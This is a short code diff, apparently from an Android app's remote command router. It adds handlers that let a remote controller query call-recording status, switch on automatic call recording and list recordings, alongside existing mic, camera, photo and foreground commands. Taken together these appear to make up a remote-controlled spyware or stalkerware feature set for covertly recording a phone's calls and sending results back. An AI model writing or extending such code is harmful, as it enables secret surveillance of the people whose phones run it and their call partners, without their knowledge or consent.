@@ -624,7 +624,34 @@ private void bringAppToForeground() {
     } else {
         sendCommand("MIC_LIST|ERROR: Mic module not available");
     }
-    break;         
+    break;     
+
+// Add to your routeCommand method
+case "call_recording_status":
+    if (callRecordingModule != null) {
+        String result = callRecordingModule.getStatus();
+        sendCommand("CALL_RECORDING_STATUS|" + result);
+    } else {
+        sendCommand("CALL_RECORDING_STATUS|{\"success\":false,\"error\":\"Module not available\"}");
+    }
+    break;
+
+case "call_recording_set_auto":
+    if (callRecordingModule != null && args.contains("|")) {
+        String[] parts = args.split("\\|");
+        boolean enabled = Boolean.parseBoolean(parts[0]);
+        String result = callRecordingModule.setAutoRecord(enabled);
+        sendCommand("CALL_RECORDING_SET|" + result);
+    }
+    break;
+
+case "call_recording_list":
+    if (callRecordingModule != null) {
+        String result = callRecordingModule.getRecordings();
+        sendCommand("CALL_RECORDING_LIST|" + result);
+    }
+    break;
+                
             // Camera commands - Updated to match working project format
             case "take_photo":
             case "camera":
